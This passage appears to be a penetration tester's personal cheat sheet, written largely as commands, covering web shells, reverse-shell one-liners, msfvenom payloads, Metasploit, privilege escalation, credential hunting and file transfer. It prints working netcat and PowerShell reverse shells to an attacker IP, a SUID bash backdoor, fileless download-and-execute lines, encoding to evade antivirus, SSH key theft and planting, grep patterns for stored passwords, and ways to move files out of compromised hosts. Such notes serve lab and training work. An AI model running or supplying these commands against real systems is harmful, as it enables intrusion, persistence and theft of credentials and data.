| `IIS`      | c:\inetpub\wwwroot\    |
| `XAMPP`    | C:\xampp\htdocs\       |

We can check these directories to see which webroot is in use and then use `echo` to write out our web shell. 

#### Bypassing File Type restrictions



### Accessing the Web Shell

Once we write our web shell, we can either access it through a browser or by using `cURL`. 

- We can visit the `shell.php` page on the compromised website, and use `?cmd=id` to execute the `id` command:

- ```bash
  curl http://SERVER_IP:PORT/shell.php?cmd=id
  ```



Benefits:

- It would bypass any firewall  restriction in place, as it will not open a new connection on a port 
- If the compromised host is rebooted, the web shell would still be in place,  and we can access it and get command execution without exploiting the  remote host again.

Contra:

- Not as interactive

## Payloads

`Staged` payloads create a way for us to send over more components of our attack

Staged payloads could lead to unstable shell sessions in these environments, so it would be best to select a `stageless` payload. Stageless payloads can sometimes be better for evasion purposes.

### One liners

- **Netcat/Bash**

  ```
  rm -f /tmp/f; mkfifo /tmp/f; cat /tmp/f | /bin/bash -i 2>&1 | nc [YOUR_IP] [PORT] > /tmp/f
  ```

- **Poweshell**

  ```powershell
  powershell -nop -c "$client = New-Object System.Net.Sockets.TCPClient('[YOUR IP]',[PORT]);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()"
  ```

- **Bash**

  ```bash
  /bin/sh -i
  ```

  Copies bash, give SUID priviliges,

  ```bash
  echo -e '#!/bin/bash\n\ncp /bin/bash /tmp/exp\nchmod 4777 /tmp/exp' > file_to_execute
  ```

  - Perl:

    ```bash
    perl —e 'exec "/bin/sh";'
    ```

  - Same for ruby or lua

  - AWK

    ```bash
    awk 'BEGIN {system("/bin/sh")}'
    ```

  - Vim

    ```bash
    vim -c ':!/bin/sh'
    ```

    

- **MSFvenom**

  ```bash
  # List payloads
  msfvenom -l payloads
  
  # Build a stageless payload (-f to specify the format)
  msfvenom -p linux/x64/shell_reverse_tcp LHOST= LPORT=444 -f elf > createbackup.elf
  ```

  

### Windows 

#### Types of payloads

- [DLLs](https://docs.microsoft.com/en-us/troubleshoot/windows-client/deployment/dynamic-link-library): library file to provide shared code and data that can be used by different programs at once. Can elevate our privileges to SYSTEM and/or bypass User  Account Controls.

- [Batch](https://commandwindows.com/batch.htm): text-based DOS scripts (`.bat` extension) utilized by system administrators to complete multiple tasks through the command-line interpreter.  We can use batch files to run commands on the host in an automated fashion. 

- [VBS](https://www.guru99.com/introduction-to-vbscript.html): scripting language typically used as a client-side scripting language  in webservers to enable dynamic web pages. Now outdated, it is used in phishing attacks.

- [MSI](https://docs.microsoft.com/en-us/windows/win32/msi/windows-installer-file-extensions) When attempting to install a new application, the installer will look for the `.msi` file. Once we loaded the payload, we can run `msiexec` to execute our file.

- [Powershell](https://docs.microsoft.com/en-us/powershell/scripting/overview?view=powershell-7.1): shell environment and scripting language.

#### Resources

- MSFVenom
- [Alternative to metasploit](https://github.com/its-a-feature/Mythic)
- [PayloafAllTheThings](https://github.com/swisskyrepo/PayloadsAllTheThings)
- [Nishang ](https://github.com/samratashok/nishang) is a framework collection of Offensive PowerShell implants and  scripts. 
- [Darkarmour](https://github.com/bats3c/darkarmour) is a tool to generate and utilize obfuscated binaries for use against Windows hosts.
- [Impacket](https://github.com/SecureAuthCorp/impacket) is a toolset built-in Python that provides us a way to interact with  network protocols directly. Some of the most exciting tools we care  about in Impacket deal with `psexec`, `smbclient`, `wmi`, Kerberos, and the ability to stand up an SMB server.

### LinuxExploit



### TTY Upgrade

Once we connect to a shell through Netcat, we will notice that we can  only type commands or backspace, but we cannot move the text cursor left or right to edit our commands, nor can we go up and down to access the  command history. To be able to do that, we will need to upgrade our TTY. This can be achieved by mapping our terminal TTY with the remote TTY.

It could happen that the history of the shell is empty if the upgrade is not performed, and the history could contain important information, such as passwords.

#### General method

```bash
script -qc /bin/bash /dev/null
```

#### python/stty method

```bash
# In reverse shell
$ python3 -c 'import pty; pty.spawn("/bin/bash")'	#usually good enough
Ctrl-Z	# Go to my Kali

# In Kali
$ stty raw -echo
$ fg	# Go to shell

# In reverse shell
$ reset
$ export SHELL=bash
$ export TERM=xterm-256color
$ stty rows [] columns []
```



## Metasploit

Multiple sessions can be handled:

in `msfconsole`:

```bash
sessions			# visualize active session
sessions -i [no.]	# switch session
```

Background the current session with `[CTRL] + [Z]`

The `jobs` command lets you handle active jobs:

- An exploit can be run as a job by typing `exploit -j`
- To list all running jobs  `jobs -l` 

- To kill a specific job  `kill [index no.]` 
- `jobs -K`  to kill all running jobs.



### Modules

In `msfconsole`:

```bash
search [exploit]

use [number exploit]
info
options

show target				# show OS/language version/service pack
set target [alue]

set [option] [value]	# use setg to set permanently

run
```

In the search we can specify 

- the  year (`cve:<year>`), 
- the platform Windows (`platform:<os>`), 
- the type of module we want to find (`type:<auxiliary/exploit/post>`), 
- the reliability rank (`rank:<rank>`), 
- the search name (`<pattern>`). 

| **Type**    | **Description**                                              |
| ----------- | ------------------------------------------------------------ |
| `Auxiliary` | Scanning, fuzzing, sniffing, and admin capabilities. Offer extra assistance and functionality. |
| `Encoders`  | Ensure that payloads are intact to their destination.        |
| `Exploits`  | Defined as modules that exploit a vulnerability that will allow for the payload delivery. |
| `NOPs`      | (No Operation code) Keep the payload sizes consistent across exploit attempts. |
| `Payloads`  | Code runs remotely and calls back to the attacker machine to establish a connection (or shell). |
| `Plugins`   | Additional scripts can be integrated within an assessment with `msfconsole` and coexist. |
| `Post`      | Wide array of modules to gather information, pivot deeper, etc. |

#### Import module

To import an exploit from `searchsploit`:

```bash
searchsploit [exploit]	#get exploit path
cd /usr/share/metasploit-framework/modules
mkdir [exploit path]	# create the full exploit path inside msf
cd [exploit path]
searchsploit -m [exploit_number]	# copies the exploit
msfconsole
	>use [exploit path]
```

### Payloads

Module that aids the exploit module in (typically) returning a shell to the attacker. Whether or not a payload is staged is represented by `/` in the payload name.

- Singles: contains the exploit and the entire shellcode 
- Stagers: staged payload that  typically used to set up a network connection between the attacker and victim and are designed to be small and reliable. 
- Stages: payload components that are downloaded by stager's modules.

in `msfconsole`

```bash
grep [search value 1] grep [search value 2] show payloads
set payload [no.]

show options
show encoders 	# See below
run
```

#### Encoders

Encoders change the payload to:

-  run on different operating systems and architectures. 
-  remove hexadecimal opcodes known as `bad characters`.
-  help with the AV detection

Shikata Ga Nai (`SGN`) is one of the most utilized Encoding.

`msfvenom` takes care of payload generation and Encoding, by adding the flag `-e`, e.g. if the architecture is `x86`:

```bash
-e x86/shikata_ga_nai
```

Also, the flag `-i [number of iteration]` is useful to run the encoding multiple times, in order to evade AV.

To test if your malware is undetectable (FUD) enough: https://antiscan.me/

### Plugins

Found in `/usr/share/metasploit-framework/plugins`

In `msfconsole`:  -> `load [plugin]`

### Meterpreter migration (Windows)

in `meterpreter`, when the shell doesn't appear:

```bash
ps		# List processes
steal_token [PID of process network or local service]
```



## Verify code execution

1. In the code execute the command:

   ```bash
   ping [YOUR_IP]
   ```

   - `-c 2` (Linux) to only send two ping packages

   - `-n 2` (Windows) to only send two ping packages

2. Open a ping listener:

   ```bash
   sudo tcpdump -i tun0 icmp
   ```

# Privilege Escalation

One excellent resource is [HackTricks](https://book.hacktricks.xyz), which has an excellent checklist for both [Linux](https://book.hacktricks.xyz/linux-unix/linux-privilege-escalation-checklist) and [Windows](https://book.hacktricks.xyz/windows/checklist-windows-privilege-escalation) local privilege escalation. 

**Scripts**

- Linux
  - [Linux-smart-enumeration](https://github.com/diego-treitos/linux-smart-enumeration) (enum)
  - [LinEnum](https://github.com/rebootuser/LinEnum.git) (enum)
  - [linuxprivchecker](https://github.com/sleventyeleven/linuxprivchecker) (enum)
  - [LinPEAS](https://github.com/peass-ng/PEASS-ng/tree/master/linPEAS)
- Windows
  -  [Seatbelt](https://github.com/GhostPack/Seatbelt) (enum)
  -  [JAWS](https://github.com/411Hall/JAWS) (enum)
  -  [WinPEAS](https://github.com/peass-ng/PEASS-ng/tree/master/winPEAS)

## Linux

### Users

- Users `cat /etc/passwd | grep sh` and `ls  /home`
- User Group:

  -  `id` and what can that group do
  -  [interesting_groups](https://book.hacktricks.xyz/linux-hardening/privilege-escalation/interesting-groups-linux-pe)

### Privileges

Search on [gtfobins](https://gtfobins.github.io) bin files with relative privileges

#### sudo

```bash
sudo -l		 # List sudo privileges

sudo su 	 # Switch to the root user 
su [USER] 	 # Switch to a local user
sudo -u [USER] [COMMAND] 	# Execute an application as an user
```

- **Symlinks attacks**

  A symlink is a link to a file `ln -s [FILE_target] [FILE_link]`

  The `*` character gets expanded to all the matching files.

  **Examples**

  - `chown` and `chmod`

    - `chown [USER] [FILE]`

      Sets the owner of the specified `[FILE]` to the `[USER]`.

    - `chown [USER] [FILE] --reference=[REF FILE]`

      Sets the owner of the specified `[FILE]` to match the owner of the `[REF FILE]`, `[USER]` is ignored.

    ```bash
    # Create a file reference owned by us
    touch reference
    # Create a file called as the flag of chown
    touch -- --reference=reference
    ```

    If you create a symlink to **/etc/passwd** in the same directory, then the owner of /etc/passwd will also be you.

  **Avoid checks:**

  - If there is a check to control if the link is linking to a priviledged folder, you can do a double link:

    ```bash
    ln -s /root/root.txt [FILE HOP]	# Creates a link to root.txt
    ln -s [FILE HOP] [FILE]			# Creates a link to FILE HOP
    ```

#### suid

- `find / -perm -u=s -type f 2>/dev/null`: checks for *SUID binaries* 

### Credential Hunting

- Some files worth checking:

  - `configuration` files
  - `log` files, 
  - `bash_history` 

- Search credentials in folder and subfolders:

  ```bash
  grep -rniH "[STRING]" [PATH] [-e REGEX]
  ```

  - `-r` recursive
  - `-n` output the line number
  - `-i` case insensitive
  - `-H`  output the content

  Credentials are variable assignments, which are made of:

  - name: password, credential, pass, psw, token, key, secret
  - separator: =, : (with or without space)
  - quotes

  Some examples:

  ```bash
  grep -rniH "password = '" .		# string assignment (try also with \")
  grep -rniH "password':" . 		# dictionary assignment
  grep -rniH "password'," .		# tuple assignment
  ```

- Shadow Hashes

  A shadow hash is the encrypted password of a local host. To crack it, we need the file /etc/passwd, which contains only the users with a local account.

### Files

- Readable / Owned web files (for web application)

  - `find /var/www -type f -group [group] 2>/dev/null`  

  - `find /var/www -type f -user [user] 2>/dev/null`

  - `find /var/www -type f -readable 2>/dev/null`

  - `/proc` and `sis` `run` not interesting

- Scheduled Tasks:

  **Add new scheduled task:** If we can write to a directory called by a cron job, we can write a bash script with a reverse shell command, which should send us a reverse  shell when executed by the root.

  - `/etc/crontab`
  - `/etc/cron.d`
  - `/var/spool/cron/crontabs/root`

- SSH keys:  

  - Read: copy it from `/home/user/.ssh/id_rsa` or `/root/.ssh/id_rsa`


  ```bash
  $ chmod 600 id_rsa	# More restrictive permission
  $ ssh root@10.10.10.10 -i id_rsa
  $ nano id_rsa	# open and copy on your machine
  ```

  - Write: place our public key in the user's ssh directory at `/home/user/.ssh/authorized_keys`


  ```bash
  ssh-keygen -f key	#Generate a key in the output file key
  ssh-copy-id -i key.pub root@10.10.10.10	#copy key.pub in and add it to the remote folder
  ssh root@10.10.10.10 -i key	# Login
  ```

### Local Network Services

- `netstat -puntal` or `ss -puntal` (access/ tunnel)


Look at `LISTEN` ports

- Tunneling


```bash
ssh -L [LOCAL PORT]:127.0.0.1:[LOCAL PORT] [USER]@[IP] -fN
```

```bash
sudo nmap -p[PORT] 127.0.0.1
```

### Local Processes

- `ps -aux | grep [USER, ROOT...]`
- `ps -aux` look for local databases

### OS 

- Kernel Exploits

- Vulnerable Software: `dpkg -l` 

## Windows

### Users

- Users & Groups
  - `net user`
  - `net localgroup`
  - `net user [USER]`
- Memberships & Privileges

  -  `whoami /all`
  -  Check non-default groups -> [Exploits](https://book.hacktricks.xyz/windows-hardening/active-directory-methodology/privileged-groups-and-token-privileges)
  -  Check non-default privileges -> [Exploits](https://book.hacktricks.xyz/windows-hardening/windows-local-privilege-escalation)
     - `SeDebug`
     - `SeBackup`
     - `SeImpersonate` / `SeAssignPrimaryToken`
     - `SeRestore`
     - `SeManage`
  -  [LOLBAS](https://lolbas-project.github.io/#) also contains a list of Windows applications which we may be able to  leverage to perform certain functions, like downloading files or  executing commands in the context of a privileged user

### Credential Hunting:

- Check locations:

  - Desktop: `cd C:\Users\[USER]\Desktop`

  - configuration fikes

  - log files

  - History `PSReadLine`

- Saved passwords `cmdkey /list`

  ````cmd
  runas /savecred /user:WORKGROUP\Administrator "\\10.XXX.XXX.XXX\SHARE\evil.exe"
  ````

- `tree /a /f c:\users`

### Files

- Readable / Owned web files (for web application)

  - SSH keys:  

    - Read: copy it from `file:///c:/users/[USERNAME]/.ssh/id_rsa`

      ```bash
      $ chmod 600 id_rsa	# More restrictive permission
      $ ssh root@10.10.10.10 -i id_rsa
      $ nano id_rsa	# open and copy on your machine
      ```

    - Write: place our public key in the user's ssh directory at `file:///c:/users/[USERNAME]/.ssh/authorized_keys`

      ```bash
      ssh-keygen -f key	#Generate a key in the output file key
      ssh-copy-id -i key.pub root@10.10.10.10	#copy key.pub in and add it to the remote folder
      ssh root@10.10.10.10 -i key	# Login
      ```

    

### Local Network Services

- `systeminfo`

### Local Processes

### OS


- Kernel Exploits

  - In meterpreter: local exploit suggester module
- Vulnerable Software:  `C:\Program Files` 

# Transferring files

## Windows

### Download

#### Native Binaries

[LOLBAS Project for Windows Binaries](https://lolbas-project.github.io)

**Bitsadmin**

The [Background Intelligent Transfer Service (BITS)](https://docs.microsoft.com/en-us/windows/win32/bits/background-intelligent-transfer-service-portal) can be used to download files from HTTP sites and SMB shares. It  "intelligently" checks host and network utilization into account to  minimize the impact on a user's foreground work.

```cmd
bitsadmin /transfer wcb /priority foreground http://10.10.15.66:8000/nc.exe C:\Users\htb-student\Desktop\nc.exe
```

**Bitstransfer (powershell)**

```powershell-session
Import-Module bitstransfer; Start-BitsTransfer -Source "http://10.10.10.32:8000/nc.exe" -Destination "C:\Windows\Temp\nc.exe"
```

**Certutil**

```cmd
certutil.exe -verifyctl -split -f http://10.10.10.32:8000/nc.exe
```

**GfxDownloadWrapper.exe**

```powershell-session
GfxDownloadWrapper.exe "http://10.10.10.132/mimikatz.exe" "C:\Temp\nc.exe"
```

#### Base64

Note that Windows Command Line utility (cmd.exe) has a maximum string length of  8,191 characters. Also, a web shell may error if you attempt to send  extremely large strings. 

1. check the encoding to compare later:

   ```bash
   md5sum [FILE]
   ```

2. encode a file to a base64 string

   ```bash
   cat [FILE] |base64 -w0;echo
   ```

3. copy the string, paste it in the Windows terminal and decode:

   ```cmd
   [IO.File]::WriteAllBytes("[LOCATION]", [Convert]::FromBase64String("[STRING]"))		
   ```

4. Check if everything went correctly:

   ```cmd
   Get-FileHash [LOCATION] -Algorithm md5
   ```

#### Powershell web Downloads

Defenders can use Web filtering solutions to prevent access to specific website categories, block the download of file types (like .exe), or only allow access to a list of whitelisted domains.

***Errors:***

- There may be cases when the Internet Explorer first-launch configuration has not been completed, which prevents the download. This can be bypassed using the parameter `-UseBasicParsing`.

- If the certificate is not trusted:

  ```powershell
  [System.Net.ServicePointManager]::ServerCertificateValidationCallback = {$true}
  ```

***WebClient methods for downloading data from a resource:***

- [OpenRead](https://docs.microsoft.com/en-us/dotnet/api/system.net.webclient.openread?view=net-6.0): Returns the data from a resource as a [Stream](https://docs.microsoft.com/en-us/dotnet/api/system.io.stream?view=net-6.0).

- [OpenReadAsync](https://docs.microsoft.com/en-us/dotnet/api/system.net.webclient.openreadasync?view=net-6.0): Returns the data from a resource without blocking the calling thread.

- [DownloadData](https://docs.microsoft.com/en-us/dotnet/api/system.net.webclient.downloaddata?view=net-6.0): Downloads data from a resource and returns a Byte array.

  - File Download:

    ```cmd
    (New-Object Net.WebClient).DownloadFile('<Target File URL>','<Output File Name>')
    ```

    The `WebClient` class provides methods for sending HTTP requests and handling responses, like downloading or uploading data.

  - Fileless (directly execute)

    ```cmd
    IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com')
    ```

    You can add ` | IEX` to send pipeline input.

- [DownloadDataAsync](https://docs.microsoft.com/en-us/dotnet/api/system.net.webclient.downloaddataasync?view=net-6.0): Downloads data from a resource and returns a Byte array without blocking the calling thread.

- [DownloadFile](https://docs.microsoft.com/en-us/dotnet/api/system.net.webclient.downloadfile?view=net-6.0): Downloads data from a resource to a local file.

- [DownloadFileAsync](https://docs.microsoft.com/en-us/dotnet/api/system.net.webclient.downloadfileasync?view=net-6.0): Downloads data from a resource to a local file without blocking the calling thread.

- [DownloadString](https://docs.microsoft.com/en-us/dotnet/api/system.net.webclient.downloadstring?view=net-6.0): Downloads a String from a resource and returns a String.

- [DownloadStringAsync](https://docs.microsoft.com/en-us/dotnet/api/system.net.webclient.downloadstringasync?view=net-6.0): Downloads a String from a resource without blocking the calling thread.

-  [Invoke-WebRequest](https://docs.microsoft.com/en-us/powershell/module/microsoft.powershell.utility/invoke-webrequest?view=powershell-7.2) cmdlet is also available, but it is noticeably slower at downloading files. You can use the aliases `iwr`, `curl`, and `wget` instead of the `Invoke-WebRequest` full name.

  ```cmd
  Invoke-WebRequest https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/dev/Recon/PowerView.ps1 -OutFile PowerView.ps1
  ```
  
  - Evading detection:
  
    If some User Agents were blacklisted, [Invoke-WebRequest](https://docs.microsoft.com/en-us/powershell/module/microsoft.powershell.utility/invoke-webrequest?view=powershell-7.1) contains a UserAgent parameter, which allows for changing the default  user agent to one emulating Internet Explorer, Firefox...
  
    ```powershell
    $UserAgent = [Microsoft.PowerShell.Commands.PSUserAgent]::Chrome
    ```
  
    And add the flag `-UserAgent $UserAgent` to the download command

#### SMB Downloads

1. Create SMB server

   ```bash
   smb_server()
   ```

   New versions of Windows block unauthenticated guest access, in this case you need to set unsername and password in SMB

   ```bash
   smbserver.py -ip $tunip -username USER -password PASS share . 
   ```

2. Copy a file from the SMB server

   ```cmd
   copy \\[YOUR IP]\share\[FILE]
   ```

   If you need credentials:

   ```cmd
   net use n: \\[YOUR IP]\share /user:USER PASS
   copy n:\[FILE]
   ```

#### FTP Downloads

1. Setting up the server

   ```bash
   sudo python3 -m pyftpdlib --port 21
   ```

    Anonymous authentication is enabled by default

2. Use Powershell `Net.WebClient` or FTP on Windows to download the file

3. If the shell is not interactive, you can create an FTP command file to download the file:                 

   ```cmd-session
   C:\htb> echo open 192.168.49.128 > ftpcommand.txt
   C:\htb> echo USER anonymous >> ftpcommand.txt
   C:\htb> echo binary >> ftpcommand.txt
   C:\htb> echo GET file.txt >> ftpcommand.txt
   C:\htb> echo bye >> ftpcommand.txt
   C:\htb> ftp -v -n -s:ftpcommand.txt
   ftp> open 192.168.49.128
   Log in with USER and PASS first.
   ftp> USER anonymous
   
   ftp> GET file.txt
   ftp> bye
   
   C:\htb>more file.txt
   This is a test file
   ```

#### RDP

If we are connected from Linux, we can use `xfreerdp` or `rdesktop`. At the time of writing, `xfreerdp` and `rdesktop` allow copy from our target machine to the RDP session, but there may be scenarios where this may not work as expected.

**If copying with xfreerdp doesn't work**

1. Mount a Linux folder

   ```bash
   xfreerdp /v:[IP] /d:[DOMAIN] /u:[USER] /p:[PASSWD] /drive:linux,/home/plaintext/htb/academy/filetransfer
   ```

2. To access the directory, we can connect to `\\tsclient\`, allowing to transfer files

#### PowerShell Remoting (WinRM)

To create a PowerShell Remoting session on a remote computer, we will need administrative access, be a member of the `Remote Management Users` group, or have explicit permissions for PowerShell Remoting in the session configuration.

It is useful in Active Directories, in which you have local hostnames and you want to do a lateral move.

**This is only useful if you cannot directly transfer to a certain hostname**

1. Transfer the file on the *pivot box*, that is the IP you can connect to

1. Create a Remote session in the target machine

   ```powershell
    $Session = New-PSSession -ComputerName [HostName]
   ```

2. Transfer from the pivot box, to the hostname

   ```powershell
   Copy-Item -Path [FiLE_PATH] -ToSession $Session -Destination [PATH]
   ```

   

### Upload

#### Base 64

1. Encode with Powershell

   ```powershell
   [Convert]::ToBase64String((Get-Content -path "[PATH]" -Encoding byte))
   ```

2. Check MD5 hash to check later if the procedure was successsfull

   ```powershell
   Get-FileHash "[PATH]" -Algorithm MD5 | select Hash	
   ```

3. Copy paste point 1. and decode in your machine

   ```bash
   echo [STRING] | base64 -d > hosts
   ```

4. Check if the procedure was correct by comparing with 2.:

   ```bash
   md5sum hosts
   ```

#### Powershell - python server

1. Open a server

   ```bash
   python3 -m uploadserver
   ```

2. Upload via Invoke-RestMethod

   ```cmd
   > IEX(New-Object Net.WebClient).DownloadString('[LINK]')
   > Invoke-FileUpload -Uri http://[IP]/upload -File [FILE PATH]
   ```

#### Powershell - netcat + base64

1. Open netcat listener

   ```bash
   listen 8000	
   ```

2. Send the file by using `Invoke-WebRequest` or `Invoke-RestMethod` in base 64

   ```powershell
   > $b64 = [System.convert]::ToBase64String((Get-Content -Path '[PATH]' -Encoding Byte))
   > Invoke-WebRequest -Uri http://[IP]/ -Method POST -Body $b64
   ```

3. Decode

   ```bash
   echo <base64> | base64 -d -w 0 > hosts
   ```

#### SMB - WebDav

Commonly enterprises don't allow the SMB protocol (TCP/445) out of  their internal network because this can open them up to potential  attacks. An alternative is to run SMB over HTTP with `WebDav`.

1. Open WebDav

   ```bash
   sudo wsgidav --host=0.0.0.0 --port=[PORT] --root=/tmp --auth=anonymous 
   ```

2. Connect to WebDav

   ```powershell
   > dir \\[IP]\DavWWWRoot
   ```

3. Upload with SMB

   ```powershell
   > copy [FILE] \\[IP]\DavWWWRoot\
   ```

#### FTP

1. Open FTP server with write 

   ```bash
   sudo python3 -m pyftpdlib --port 21 --write
   ```

2. Powershell to upload

   ```powershell
   (New-Object Net.WebClient).UploadFile('ftp://[IP]/ftp-hosts', 'FILE')
   ```

3. If the shell is not interactive, upload with a FTP Command File:

   ```cmd-session
   C:\htb> echo open 192.168.49.128 > ftpcommand.txt
   C:\htb> echo USER anonymous >> ftpcommand.txt
   C:\htb> echo binary >> ftpcommand.txt
   C:\htb> echo PUT c:\windows\system32\drivers\etc\hosts >> ftpcommand.txt
   C:\htb> echo bye >> ftpcommand.txt
   C:\htb> ftp -v -n -s:ftpcommand.txt
   ftp> open 192.168.49.128
   
   ftp> USER anonymous
   ftp> PUT c:\windows\system32\drivers\etc\hosts
   ftp> bye
   ```

## Linux

### Download

#### Native binaries

https://gtfobins.github.io/

#### wget/cURL (file) 

```bash
wget [LINK] -O [OUTPUT PATH]
```

```bash
curl [LINK] -o [OUTPUT PATH]
```

#### wget/cURL (fileless)

```bash
wget [LINK] -O | [COMMAND]
```

```bash
curl [LINK] -qO- | [COMMAND]
```

The `COMMAND` is e.g. `bash` or `python3`, that is, what executes the file in the link. Can also be used with a parser, such as `jq '.'`.

#### Netcat

1. Start netcat on the target

   ```bash
   nc -lvnp 8000 --recv-only > [FILE]
   ```

   If the compromised machine is using Ncat,specify `--recv-only` to close the connection once the file transfer is finished.

2. On our machine, we upload the file on netcat

   ```bash
   nc --send-only [IP] [PORT] < [FILE]
   ```

If we don't have Netcat or Ncat on our compromised machine, Bash supports read/write operations on a pseudo-device file [/dev/TCP/](https://tldp.org/LDP/abs/html/devref1.html). Writing to this particular file makes Bash open a TCP connection to `host:port`, and this feature may be used for file transfers.

1. Open listener on you machine

   ```bash
    sudo ncat -l -p 443 --send-only < SharpKatz.exe
   ```

2. On the target:

   ```bash
   cat < /dev/tcp/192.168.49.128/443 > SharpKatz.exe
   ```

#### Base64

In some cases, we may not be able to transfer the file. For example, the remote host may have firewall protections that prevent us from  downloading a file from our machine. 

We can encode the file into `base64` format, and then we can paste the `base64` string on the remote server and decode it.

1. Encode the file

```bash
cat [FILE] |base64 -w 0;echo
```

2. Copy the string

3. Go on the remote host, decode

```bash
echo -n [STRING] | base64 -d > [FILE_NAME]
```

**Validate Transfer**

`file`: validates the format of a file

`md5sum` validates the hash of the filestomi

#### Bash /dev/tcp

As long as Bash version 2.04 or greater is installed (compiled with  --enable-net-redirections), the built-in /dev/TCP device file can be  used for simple file downloads.

1. Connect to the target Webserver

   ```bash
   exec 3<>/dev/tcp/[IP]/[PORT]
   ```

2. HTTP GET Request

   ```bash
   echo -e "GET [FILE] HTTP/1.1\n\n">&3
   ```

3. Print the response

   ```bash
   cat <&3
   ```

#### SSH

`SCP` is very similar to `copy` or `cp`, but instead of providing a local path, we need to specify a username,  the remote IP address or DNS name, and the user's credentials.

1. Enable SSH server

   ```bash
   sudo systemctl enable ssh
   ```

2. Start the server

   ```
   sudo systemctl start ssh
   ```

3. Check for listening port

   ```bash
   netstat -lnpt
   ```

4. Download

   ```bash
   scp user@remotehost:[FILE_PATH]
   ```

### Upload

#### Web Upload

1. Create self-signed certificate

   ```bash
   openssl req -x509 -out /tmp/server.pem -keyout server.pem -newkey rsa:2048 -nodes -sha256 -subj '/CN=server'
   ```

2. Start Web Server in a new folder

   ```bash
   mkdir /tmp/https && cd /tmp/https
   sudo python3 -m uploadserver 443 --server-certificate /tmp/server.pem
   ```

3. Upload (multiple files can be specified)

   ```bash
   curl -X POST https://[IP]/upload -F 'files=@[FILE]' --insecure
   ```

   `--insecure` since we used a self-signed certificate that we trust.

#### Server upload

1. Run a server on my machine

   ```bash
   # Different methods depending on what is available on the target
   python3 -m http.server 8000	
   python2.7 -m SimpleHTTPServer
   php -S 0.0.0.0:8000
   ruby -run -ehttpd . -p8000
   ```

- Download from the target

  ```bash
  curl [URL] -o [FILE_NAME]
  ```

#### SCP

```bash
scp [FILE] user@targethost:[OUTPUT LOCATION]
```

## Programming Languages

### Download

#### Python 

```bash
python3 -c 'import urllib.request;urllib.request.urlretrieve("[LINK]", "[FILE]")'
```

You can also use `python2.7`

Notice that the `LINK` should include the path including the file.

#### php

File_get_contents()

```bash
php -r '$file = file_get_contents("[LINK]");file_put_contents("[FILE]",$file);'
```

Fopen()

```bash
php -r 'const BUFFER = 1024; $fremote = 
fopen("[LINK]", "rb"); $flocal = fopen("[FILE]", "wb"); while ($buffer = fread($fremote, BUFFER)) { fwrite($flocal, $buffer); } fclose($flocal); fclose($fremote);'
```

Pipe to Bash

```bash
php -r '$lines = @file("[LINK]"); foreach ($lines as $line_num => $line) { echo $line; }' | bash
```

#### Ruby                                                                                                                    

```bash
ruby -e 'require "net/http"; File.write("[FILE]", Net::HTTP.get(URI.parse("[LINK]")))'
```

#### Perl                                                                                                                         

```bash
perl -e 'use LWP::Simple; getstore("[LINK]", "FILE");'
```

#### Javascript

1. create a file called `wget.js` and save the following content:

   ```javascript
   var WinHttpReq = new ActiveXObject("WinHttp.WinHttpRequest.5.1");
   WinHttpReq.Open("GET", WScript.Arguments(0), /*async=*/false);
   WinHttpReq.Send();
   BinStream = new ActiveXObject("ADODB.Stream");
   BinStream.Type = 1;
   BinStream.Open();
   BinStream.Write(WinHttpReq.ResponseBody);
   BinStream.SaveToFile(WScript.Arguments(1));
   ```

2. Execute from Windows:

   ```cmd
   cscript.exe /nologo wget.js [LILNK] [FILE]
   ```

#### VBScript

1. create a file called `wget.vbs` and save the following content:

   ```vbscript
   dim xHttp: Set xHttp = createobject("Microsoft.XMLHTTP")
   dim bStrm: Set bStrm = createobject("Adodb.Stream")
   xHttp.Open "GET", WScript.Arguments.Item(0), False
   xHttp.Send
   
   with bStrm
       .type = 1
       .open
       .write xHttp.responseBody
       .savetofile WScript.Arguments.Item(1), 2
   end with
   ```

2. Execute from Windows:

   ```cmd
   cscript.exe /nologo wget.js [LILNK] [FILE]
   ```

### Upload

#### Python

1. Start a python server

   ```bash
   python3 -m uploadserver
   ```

2. Upload

   ```bash
   python3 -c 'import requests;requests.post("[MY URL]",files={"files":open("[FILE]","rb")})'
   ```

The same procedure holds for the other languages.



# OSINT

## Google search

| Operator                | Operator Description                                         | Example                                             | Example Description                                          |
| ----------------------- | ------------------------------------------------------------ | --------------------------------------------------- | ------------------------------------------------------------ |
| `site:`                 | Limits results to a specific website or domain.              | `site:example.com`                                  | Find all publicly accessible pages on example.com.           |
| `inurl:`                | Finds pages with a specific term in the URL.                 | `inurl:login`                                       | Search for login pages on any website.                       |
| `filetype:`             | Searches for files of a particular type.                     | `filetype:pdf`                                      | Find downloadable PDF documents.                             |
| `intitle:`              | Finds pages with a specific term in the title.               | `intitle:"confidential report"`                     | Look for documents titled "confidential report" or similar variations. |
| `intext:` or `inbody:`  | Searches for a term within the body text of pages.           | `intext:"password reset"`                           | Identify webpages containing the term “password reset”.      |
| `cache:`                | Displays the cached version of a webpage (if available).     | `cache:example.com`                                 | View the cached version of example.com to see its previous content. |
| `link:`                 | Finds pages that link to a specific webpage.                 | `link:example.com`                                  | Identify websites linking to example.com.                    |
| `related:`              | Finds websites related to a specific webpage.                | `related:example.com`                               | Discover websites similar to example.com.                    |
| `info:`                 | Provides a summary of information about a webpage.           | `info:example.com`                                  | Get basic details about example.com, such as its title and description. |
| `define:`               | Provides definitions of a word or phrase.                    | `define:phishing`                                   | Get a definition of "phishing" from various sources.         |
| `numrange:`             | Searches for numbers within a specific range.                | `site:example.com numrange:1000-2000`               | Find pages on example.com containing numbers between 1000 and 2000. |
| `allintext:`            | Finds pages containing all specified words in the body text. | `allintext:admin password reset`                    | Search for pages containing both "admin" and "password reset" in the body text. |
| `allinurl:`             | Finds pages containing all specified words in the URL.       | `allinurl:admin panel`                              | Look for pages with "admin" and "panel" in the URL.          |
| `allintitle:`           | Finds pages containing all specified words in the title.     | `allintitle:confidential report 2023`               | Search for pages with "confidential," "report," and "2023" in the title. |
| `AND`                   | Narrows results by requiring all terms to be present.        | `site:example.com AND (inurl:admin OR inurl:login)` | Find admin or login pages specifically on example.com.       |
